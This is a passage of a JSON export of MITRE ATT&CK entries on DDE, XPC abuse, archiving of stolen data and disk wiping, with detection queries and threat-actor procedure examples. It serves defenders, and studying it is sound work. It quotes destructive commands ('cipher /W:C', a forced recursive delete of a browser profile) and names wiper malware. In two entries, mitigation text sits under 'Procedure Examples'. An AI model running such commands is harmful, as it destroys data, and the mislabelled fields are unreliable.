    "Description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded byComponent Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.[1][2][3]Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution viaPhishingcampaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.[4][5][6][7]Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.[8][9]DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to aCommand and Scripting Interpreter. DDE execution can be invoked remotely viaRemote Servicessuch asDistributed Component Object Model(DCOM).[10]",
    "Detects": [
      "Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).",
      "Monitor for newly executed processes that may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.Analytic 1 - Unusual Child Process spawned using DDE exploit(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\".exe\" (ParentImage=\"excel.exe\" OR ParentImage=\"word.exe\" OR ParentImage=\"outlook.exe\")",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. OLE and Office Open XML files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution.https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/"
    ],
    "Procedure Examples": [
      "APT28has deliveredJHUHUGITandKoadicby executing PowerShell commands through DDE in Word documents.[11][12][13]",
      "APT37has used Windows DDE for execution of commands and a malicious VBS.[14]",
      "BITTERhas executed OLE objects using Microsoft Equation Editor to download and run malicious payloads.[15]",
      "Cobalt Grouphas sent malicious Word OLE compound documents to victims.[16]",
      "FIN7spear phishing campaigns have included malicious Word documents with DDE execution.[17]",
      "Gallmakerattempted to exploit Microsoft’s DDE protocol in order to gain access to victim machines and for execution.[18]",
      "GravityRAThas been delivered via Word documents using DDE for execution.[19]",
      "HAWKBALLhas used an OLE object that uses Equation Editor to drop the embedded shellcode.[20]",
      "KeyBoyuses the Dynamic Data Exchange (DDE) protocol to download remote payloads.[21]",
      "Leviathanhas utilized OLE as a method to insert malicious content inside various phishing documents.[22]",
      "MuddyWaterhas used malware that can execute PowerShell scripts via DDE.[23]",
      "DuringOperation Sharpshooter, threat actors sent malicious Word OLE documents to victims.[24]",
      "Patchworkleveraged the DDE protocol to deliver their malware.[25]",
      "PoetRATwas delivered with documents using DDE to execute malicious code.[26]",
      "POWERSTATScan use DDE to execute additional payloads on compromised hosts.[27]",
      "Ramsayhas been delivered using OLE objects in malicious documents.[28]",
      "RTMcan search for specific strings within browser tabs using a Dynamic Data Exchange mechanism.[29]",
      "Sidewinderhas used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer.[30][31]",
      "TA505has leveraged malicious Word documents that abused DDE.[32]",
      "Valakcan execute tasks via OLE.[33]"
    ]
  },
  "T1559.003": {
    "Name": "Inter-Process Communication:XPC Services",
    "Description": "Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC ServiceC APIor the high levelNSXPCConnection APIin order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.[1][2]Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.[3][4]This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conductExploitation for Privilege Escalation.",
    "Detects": [
      "Monitor for processes making abnormal calls to higher privileged processes, such as a user application connecting to a VPN service.[5]"
    ],
    "Procedure Examples": [
      "Enable the Hardened Runtime capability when developing applications. Do not include thecom.apple.security.get-task-allowentitlement with the value set to any variation of true."
    ]
  },
  "T1560": {
    "Name": "Archive Collected Data",
    "Description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.[1]Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
    "Detects": [
      "Monitor executed commands and arguments for actions that will aid in compression or encrypting data that is collected prior to exfiltration, such as tar.",
      "Monitor newly constructed files being written with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.",
      "Monitor for newly constructed processes and/or command-lines that aid in compression or encrypting data that is collected prior to exfiltration, such as 7-Zip, WinRAR, and WinZip.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "ADVSTORESHELLencrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.[2]",
      "Agent Teslacan encrypt data with 3DES before sending it over to a C2 server.[3]",
      "AppleSeedhas compressed collected data before exfiltration.[4]",
      "APT28used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[1]",
      "APT32's backdoor has used LZMA compression and RC4 encryption before exfiltration.[5]",
      "Aria-bodyhas used ZIP to compress data gathered on a compromised host.[6]",
      "Axiomhas compressed and encrypted data prior to exfiltration.[7]",
      "Backdoor.Oldreawrites collected data to a temporary file in an encrypted form before exfiltration to a C2 server.[8]",
      "BlackBytecompressed data collected from victim environments prior to exfiltration.[9]",
      "BloodHoundcan compress data collected by its SharpHound ingestor into a ZIP file to be written to disk.[10][11]",
      "BLUELIGHTcan zip files before exfiltration.[12]",
      "Bumblebeecan compress data stolen from the Registry and volume shadow copies prior to exfiltration.[13]",
      "Cadelspyhas the ability to compress stolen data into a .cab file.[14]",
      "Chrommmecan encrypt and store on disk collected data before exfiltration.[15]",
      "Daserfhides collected data in password-protected .rar archives.[16]",
      "Dragonflyhas compressed data into .zip files prior to exfiltration.[17]",
      "Dtrackpacks collected data into a password protected archive.[18]",
      "Ember Bearhas compressed collected data prior to exfiltration.[19]",
      "Empirecan ZIP directories on the target system.[20]",
      "Epicencrypts collected data using a public key framework before sending it over the C2 channel.[21]Some variants encrypt the collected data with AES and encode it with base64 before transmitting it to the C2 server.[22]",
      "Exaramel for Windowsautomatically encrypts files before sending them to the C2 server.[23]",
      "FELIXROOTencrypts collected data with AES and Base64 and then sends it to the C2 server.[24]",
      "Following data collection,FIN6has compressed log files into a ZIP archive prior to staging and exfiltration.[25]",
      "Gold Dragonencrypts data using Base64 before being sent to the command and control server.[26]",
      "JumbledPathcan compress and encrypt exfiltrated packet captures from targeted devices.[27]",
      "TheKe3changgroup has been known to compress data before exfiltration.[28]",
      "Kesselcan RC4-encrypt credentials before sending to the C2.[29]",
      "KONNIhas encrypted data and files prior to exfiltration.[30]",
      "Lazarus Grouphas compressed exfiltrated data with RAR and used RomeoDelta malware to archive specified directories in .zip format, encrypt the .zip file, and upload it to C2.[31][32][33]",
      "Leviathanhas archived victim's data prior to exfiltration.[34]",
      "LightNeuroncontains a function to encrypt and store emails that it collects.[35]",
      "Lizarhas encrypted data before sending it to the server.[36]",
      "LoFiSecan collect files into password-protected ZIP-archives for exfiltration.[37]",
      "LuminousMothhas manually archived stolen files from victim machines before exfiltration.[38]",
      "Luridcan compress data before sending it.[39]",
      "Machetestores zipped files with profile data from installed web browsers.[40]",
      "menuPasshas encrypted files and information before exfiltration.[41][42]",
      "NETWIREhas the ability to compress archived screenshots.[43]",
      "Patchworkencrypted the collected files' path with AES and then encoded them with base64.[44]",
      "Pillowminthas encrypted stolen credit card information with AES and further encoded it with Base64.[45]",
      "PowerLesscan encrypt browser database files prior to exfiltration.[46]",
      "After collecting documents from removable media,Prikormkacompresses the collected files, and encrypts it with Blowfish.[47]",
      "Protonzips up files before exfiltrating them.[48]",
      "Raccoon Stealerarchives collected system information in a text f ile,System info.txt, prior to exfiltration.[49]",
      "Remexiencrypts and adds all gathered browser data into files for upload to C2.[50]",
      "RunningRATcontains code to compress files.[26]",
      "ShimRatReporterused LZ compression to compress initial reconnaissance reports before sending to the C2.[51]",
      "Spicacan archive collected documents for exfiltration.[52]",
      "TAINTEDSCRIBEhas usedFileReadZipSendto compress a file and send to C2.[53]",
      "Troll Stealercompresses stolen data prior to exfiltration.[54]",
      "VERMINencrypts the collected files using 3-DES.[55]",
      "WellMailcan archive files on the compromised host.[56]",
      "XCSSETwill compress entire~/Desktopfolders excluding all.gitfolders, but only if the total data size is under 200MB.[57]",
      "Zebrocyhas used a method similar to RC4 as well as AES for encryption and hexadecimal for encoding data before exfiltration.[58][59][60]"
    ]
  },
  "T1560.001": {
    "Name": "Archive Collected Data:Archive via Utility",
    "Description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such astaron Linux and macOS orzipon Windows systems.On Windows,diantzormakecabmay be used to package collected files into a cabinet (.cab) file.diantzmay also be used to download and compress files from remote locations (i.e.Remote Data Staging).[1]xcopyon Windows can copy files and directories with a variety of options. Additionally, adversaries may usecertutilto Base64 encode collected data before exfiltration.Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.[2][3][4]",
    "Detects": [
      "Monitor executed commands and arguments for actions that will aid in compression or encrypting data that is collected prior to exfiltration, such as tar.",
      "Monitor newly constructed files being written with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.",
      "Monitor for newly constructed processes and/or command-lines that aid in compression or encrypting data that is collected prior to exfiltration, such as 7-Zip, WinRAR, and WinZip. BeforeExfiltrationthat an adversary hasCollection, it is very likely that aArchive Collected Datawill be created, so that transfer times are minimized and fewer files are transmitted. There is variety between the tools used to compress data, but the command line usage and context of archiving tools, such as ZIP, RAR, and 7ZIP, should be monitored.In addition to looking for RAR or 7z program names, command line usage of 7Zip or RAR can be detected with the flag usage of \"* a *\". This is helpful, as adversaries may change program names.Note: This analytic looks for the command line argument a, which is used by RAR. However, there may be other programs that have this as a legitimate argument and may need to be filtered out.Analytic 1 - Command Line Usage of Archiving Software(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") CommandLine=\"a\""
    ],
    "Procedure Examples": [
      "Agriusused 7zip to archive extracted data in preparation for exfiltration.[5]",
      "Akirauses utilities such as WinRAR to archive data prior to exfiltration.[6]",
      "AppleSeedcan zip and encrypt data collected on a target system.[7]",
      "APT1has used RAR to compress files before moving them outside of the victim network.[8]",
      "APT28has used a variety of utilities, including WinRAR, to archive collected data with password protection.[9]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28used built-in PowerShell capabilities (Compress-Archivecmdlet) to compress collected data.[10]",
      "APT3has used tools to compress data before exfilling it.[11]",
      "APT33has used WinRAR to compress data prior to exfil.[12]",
      "APT39has used WinRAR and 7-Zip to compress an archive stolen data.[13]",
      "APT41created a RAR archive of targeted files for exfiltration.[14]Additionally,APT41used the makecab.exe utility to both download tools, such as NATBypass, to the victim network and to archive a file for exfiltration.[15]",
      "APT41 DUSTusedrarto compress data downloaded from internal Oracle databases prior to exfiltration.[16]",
      "APT5has used the JAR/ZIP file format for exfiltrated files.[17]",
      "Aquatic Pandahas used several publicly available tools, including WinRAR and 7zip, to compress collected files and memory dumps prior to exfiltration.[18][19]",
      "BRONZE BUTLERhas compressed data into password-protected RAR archives prior to exfiltration.[20][21]",
      "DuringC0026, the threat actors used WinRAR to collect documents on targeted systems. The threat actors appeared to only exfiltrate files created after January 1, 2021.[22]",
      "Calistouses thezip -rcommand to compress the data collected on the local system.[23][24]",
      "ccf32has usedxcopy \\\\<target_host>\\c$\\users\\public\\path.7z c:\\users\\public\\bin\\<target_host>.7z /H /Yto archive collected files.[25]",
      "certutilmay be used to Base64 encode collected data.[26][27]",
      "Chimerahas used gzip for Linux OS and a modified RAR software to archive data on Windows hosts.[28][29]",
      "CopyKittensuses ZPP, a .NET console program, to compress files with ZIP.[30]",
      "CORALDECKhas created password-protected RAR, WinImage, and zip archives to be exfiltrated.[31]",
      "Crutchhas used the WinRAR utility to compress and encrypt stolen files.[32]",
      "DuringCutting Edge, threat actors saved collected data to a tar archive.[33]",
      "Daserfhides collected data in password-protected .rar archives.[34]",
      "DustySkycan compress files via RAR while staging data to be exfiltrated.[35]",
      "Earth Luscahas used WinRAR to compress stolen files into an archive prior to exfiltration.[36]",
      "FIN13has compressed the dump output of compromised credentials with a 7zip binary.[37]",
      "FIN8has used RAR to compress collected data before exfiltration.[38]",
      "Fox Kittenhas used 7-Zip to archive data.[39]",
      "DuringFunnyDream, the threat actors used 7zr.exe to add collected files to an archive.[25]",
      "GALLIUMused WinRAR to compress and encrypt stolen data prior to exfiltration.[40][41]",
      "Gallmakerhas used WinZip, likely to archive data prior to exfiltration.[42]",
      "HAFNIUMhas used 7-Zip and WinRAR to compress stolen files for exfiltration.[43][44]",
      "IceApplecan encrypt and compress files using Gzip prior to exfiltration.[45]",
      "iKittenwill zip up the /Library/Keychains directory before exfiltrating it.[46]",
      "INC Ransomhas used 7-Zip and WinRAR to archive collected data prior to exfiltration.[47][48][49][50]",
      "InvisiMoleuses WinRAR to compress data that is intended to be exfiltrated.[51]",
      "Ke3changis known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration.[52][53]",
      "Kimsukyhas used QuickZip to archive stolen files before exfiltration.[54]",
      "Lotus Blossomhas used WinRAR for compressing data in RAR format.[55][56]",
      "LunarWebcan create a ZIP archive with specified files and directories.[57]",
      "Magic Houndhas used gzip to archive dumped LSASS process memory and RAR to stage and compress local folders.[58][59][60]",
      "menuPasshas compressed files before exfiltration using TAR and RAR.[61][62][63]",
      "Micropsiacreates a RAR archive based on collected files on the victim's machine.[64]",
      "MuddyWaterhas used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.[65]",
      "Mustang Pandahas used RAR to create password-protected archives of collected documents prior to exfiltration.[66][67]",
      "Octopushas compressed data before exfiltrating it using a tool called Abbrevia.[68]",
      "Okrumwas seen using a RAR archiver tool to compress/decompress data.[69]",
      "OopsIEcompresses collected files with GZipStream before sending them to its C2 server.[70]",
      "DuringOperation CuckooBees, the threat actors used the Makecab utility to compress and a version of WinRAR to create password-protected archives of stolen data prior to exfiltration.[71]",
      "DuringOperation Dream Job,Lazarus Grouparchived victim's data into a RAR file.[72]",
      "DuringOperation Honeybee, the threat actors uses zip to pack collected files before exfiltration.[73]",
      "DuringOperation Wocao, threat actors archived collected files with WinRAR, prior to exfiltration.[74]",
      "Playhas used WinRAR to compress files prior to exfiltration.[75][76]",
      "PoetRAThas the ability to compress files with zip.[77]",
      "PoshC2contains a module for compressing data using ZIP.[78]",
      "PowerShowerhas used 7Zip to compress .txt, .pdf, .xls or .doc files prior to exfiltration.[79]",
      "PUNCHBUGGYhas Gzipped information and saved it to a random temp file before exfil.[80]",
      "Pupycan compress data with Zip before sending it over C2.[81]",
      "Ramsaycan compress and archive collected files using WinRAR.[82][83]",
      "Rclonecan compress files usinggzipprior to exfiltration.[84]",
      "RedCurlhas downloaded 7-Zip to decompress password protected archives.[85]",
      "Sagerunexhas archived collected materials in RAR format.[55]",
      "SampleCheck5000can gzip compress files uploaded to a shared mailbox used for C2 and exfiltration.[86]",
      "Sea Turtleused the tar utility to create a local archive of email data on a victim system.[87]",
      "During theSolarWinds Compromise,APT29used 7-Zip to compress stolen emails into password-protected archives prior to exfltration;APT29also compressed text files into zipped archives.[88][89][90]",
      "Sowbugextracted documents and bundled them into a RAR archive.[91]",
      "ToddyCathas leveraged  xcopy, 7zip, and RAR to stage and compress collected documents prior to exfiltration.[92]",
      "Turiancan use WinRAR to create a password-protected archive for files of interest.[93]",
      "Turlahas encrypted files stolen from connected USB drives into a RAR file before exfiltration.[94]",
      "Volt Typhoonhas archived the ntds.dit database as a multi-volume password-protected archive with 7-Zip.[95][96]",
      "WindTailhas the ability to use the macOS built-in zip utility to archive files.[97]",
      "Wizard Spiderhas archived data into ZIP files on compromised machines.[98]"
    ]
  },
  "T1560.002": {
    "Name": "Archive Collected Data:Archive via Library",
    "Description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, includingPythonrarfile[1], libzip[2], and zlib[3]. Most libraries include functionality to encrypt and/or compress data.Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
    "Detects": [
      "Monitor newly constructed files being written with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "BADFLICKhas compressed data using the aPLib compression library.[4]",
      "BBSRATcan compress data with ZLIB prior to sending it back to the C2 server.[5]",
      "Cardinal RATapplies compression to C2 traffic using the ZLIB library.[6]",
      "Deniscompressed collected data using zlib.[7]",
      "Epiccompresses the collected data with bzip2 before sending it to the C2 server.[8]",
      "FoggyWebcan invoke theCommon.Compressmethod to compress data with the C# GZipStream compression class.[9]",
      "FunnyDreamhas compressed collected files with zLib.[10]",
      "InvisiMolecan use zlib to compress and decompress data.[11][12]",
      "Lazarus Groupmalware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.[13][14]",
      "LunarWebcan zlib-compress data prior to exfiltration.[15]",
      "OSX_OCEANLOTUS.Dscrambles and encrypts data using AES256 before sending it to the C2 server.[16][17]",
      "SeaDukecompressed data with zlib prior to sending it over C2.[18]",
      "TajMahalhas the ability to use the open source libraries XZip/Xunzip and zlib to compress files.[19]",
      "Threat Group-3390has used RAR to compress, encrypt, and password-protect files prior to exfiltration.[20]",
      "TheZLibbackdoor compresses communications using the standard Zlib compression library.[21]"
    ]
  },
  "T1560.003": {
    "Name": "Archive Collected Data:Archive via Custom Method",
    "Description": "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.[1]",
    "Detects": [
      "Monitor newly constructed files being written with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "ADVSTORESHELLcompresses output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm.[1]",
      "Agent.btzsaves system information into an XML file that is then XOR-encoded.[2]",
      "Attorencrypts collected data with a custom implementation of Blowfish and RSA ciphers.[3]",
      "BLUELIGHThas encoded data into a binary blob using XOR.[4]",
      "DuringC0017,APT41hex-encoded PII data prior to exfiltration.[5]",
      "CopyKittensencrypts data with a substitute cipher prior to exfiltration.[6]",
      "Modules can be pushed to and executed byDuquthat copy data to a staging area, compress it, and XOR encrypt it.[7]",
      "FIN6has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key, and Base64 with character permutation.[8][9]",
      "FLASHFLOODemploys the same encoding scheme asSPACESHIPfor data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.[10]",
      "FoggyWebcan use a dynamic XOR key and a custom XOR methodology to encode data before exfiltration. Also,FoggyWebcan encode C2 command output within a legitimate WebP file.[11]",
      "FrameworkPOScan XOR credit card information before exfiltration.[12]",
      "FunnyDreamhas compressed collected files with zLib and encrypted them using an XOR operation with the string key from the command line orqwerasdfif the command line argument doesn’t contain the key. File names are obfuscated using XOR with the same key as the compressed file content.[13]",
      "HAWKBALLhas encrypted data with XOR before sending it over the C2 channel.[14]",
      "InvisiMoleuses a variation of the XOR cipher to encrypt files before exfiltration.[15]",
      "Kimsukyhas used RC4 encryption before exfil.[16]",
      "ALazarus Groupmalware sample encrypts data using a simple byte based XOR operation prior to exfiltration.[17][18][19][20]",
      "Lotus Blossomhas used custom tools to compress and archive data on victim systems.[21]",
      "Machete's collected data is encrypted with AES before exfiltration.[22]",
      "MESSAGETAPhas XOR-encrypted and stored contents of SMS messages that matched its target list.[23]",
      "metaMainhas used XOR-based encryption for collected files before exfiltration.[24]",
      "Mustang Pandahas encrypted documents with RC4 prior to exfiltration.[25]",
      "NETWIREhas used a custom encryption algorithm to encrypt collected data.[26]",
      "Okrumhas used a custom implementation of AES encryption to encrypt collected data.[27]",
      "OopsIEcompresses collected files with a simple character replacement scheme before sending them to its C2 server.[28]",
      "OSX_OCEANLOTUS.Dhas used AES in CBC mode to encrypt collected data when saving that data to disk.[29]",
      "OwaAuthDES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.[30]",
      "Ramsaycan store collected documents in a custom container after encrypting and compressing them using RC4 and WinRAR.[31]",
      "RawPOSencodes credit card data it collected from the victim with XOR.[32][33][34]",
      "Reaverencrypts collected data with an incremental XOR key prior to exfiltration.[35]",
      "RGDoorencrypts files with XOR before sending them back to the C2 server.[36]",
      "Rising Suncan archive data using RC4 encryption and Base64 encoding prior to exfiltration.[37]",
      "SombRAThas encrypted collected data with AES-256 using a hardcoded key.[38]",
      "DataSPACESHIPcopies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.[10]",
      "Squirrelwafflehas encrypted collected data using a XOR-based algorithm.[39]",
      "StrongPitycan compress and encrypt archived files into multiple .sft files with a repeated xor encryption scheme.[40][41]",
      "Stuxnetencrypts exfiltrated data via C2 with static 31-byte long XOR keys.[42]",
      "SUGARDUMPhas encrypted collected data using AES CBC mode and encoded it using Base64.[43]",
      "T9000encrypts collected data using a single byte XOR key.[44]"
    ]
  },
  "T1561": {
    "Name": "Disk Wipe",
    "Description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques likeValid Accounts,OS Credential Dumping, andSMB/Windows Admin Shares.[1]On network devices, adversaries may wipe configuration files and other data from the device usingNetwork Device CLIcommands such aserase.[2]",
    "Detects": [
      "Monitor for direct access read/write attempts using the\\\\.\\notation.[4]Monitor for unusual kernel driver installation activity.",
      "Monitor for newly constructed drive letters or mount points to a data storage device for attempts to write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock.",
      "Monitor for changes made to drive letters or mount points of data storage devices for attempts to read to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock.",
      "Monitor for unusual kernel driver installation activity that may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources.",
      "Monitor newly executed processes that may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources."
    ],
    "Procedure Examples": [
      "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data.[3]Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
    ]
  },
  "T1561.001": {
    "Name": "Disk Wipe:Disk Content Wipe",
    "Description": "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.[1][2][3]Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.[2]Adversaries have also been observed leveraging third-party drivers likeRawDiskto directly access disk content.[1][2]This behavior is distinct fromData Destructionbecause sections of the disk are erased instead of individual files.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques likeValid Accounts,OS Credential Dumping, andSMB/Windows Admin Shares.[2]",
    "Detects": [
      "Monitor executed commands and arguments that may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.",
      "Monitor for newly constructed drive letters or mount points to a data storage device for attempts to write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock.",
      "Monitor for changes made to drive letters or mount points of data storage devices for attempts to read to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock.",
      "Monitor for unusual kernel driver installation activity may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.",
      "Monitor newly executed processes that may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources."
    ],
    "Procedure Examples": [
      "AcidPourincludes functionality to overwrite victim devices with the content of a buffer to wipe disk content.[4]",
      "AcidRainiterates over device file identifiers on the target, opens the device file, and either overwrites the file or calls various IOCTLS commands to erase it.[5]",
      "Apostlesearches for files on available drives based on a list of extensions hard-coded into the sample for follow-on wipe activity.[6]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28used the native Microsoft utilitycipher.exeto securely wipe files and folders – overwriting the deleted data usingcmd.exe /c cipher /W:C.[7]",
      "BlackCathas the ability to wipe VM snapshots on compromised networks.[8][9]",
      "cipher.execan be used to overwrite deleted data in specified folders.[7]",
      "DarkGatehas deleted all files in the Mozilla directory using the following command:/c del /q /f /s C:\\Users\\User\\AppData\\Roaming\\Mozilla\\firefox*.[10]",
      "DEADWOODdeletes files following overwriting them with random data.[6]",
      "Gamaredon Grouphas used tools to delete files and folders from victims' desktops and profiles.[11]",
      "HermeticWiperhas the ability to corrupt disk partitions and obtain raw disk access to destroy data.[12][13]",
      "Lazarus Grouphas used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and, finally, attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory.[2]",
      "MegaCortexcan wipe deleted data from all drives usingcipher.exe.[14]",
      "RawDiskhas been used to directly access the hard disk to help overwrite arbitrarily sized portions of disk content.[2]",
      "StoneDrillcan wipe the accessible physical or logical drives of the infected machine.[15]",
      "VPNFilterhas the capability to wipe a portion of an infected device's firmware.[16]",
      "WhisperGatecan overwrite sectors of a victim host's hard drive at periodic offsets.[17][18][19]"
    ]
  },
  "T1561.002": {
    "Name": "Disk Wipe:Disk Structure Wipe",
    "Description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources.Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.[1][2][3][4][5]The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable.Disk Structure Wipemay be performed in isolation, or along withDisk Content Wipeif all sectors of a disk are wiped.On a network devices, adversaries may reformat the file system usingNetwork Device CLIcommands such asformat.[6]To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques likeValid Accounts,OS Credential Dumping, andSMB/Windows Admin Shares.[1][2][3][4]",
    "Detects": [
      "Monitor executed commands and arguments that may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources.",
      "Monitor for newly constructed drive letters or mount points to a data storage device for attempts to write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock.",
      "Monitor for changes made to drive letters or mount points of data storage devices for attempts to read to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock.",
      "Monitor for unusual kernel driver installation activity may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources.",
      "Monitor newly executed processes that may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources."
    ],
    "Procedure Examples": [
      "APT37has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).[7][8]",
      "APT38has used a custom MBR wiper named BOOTWRECK to render systems inoperable.[9]",
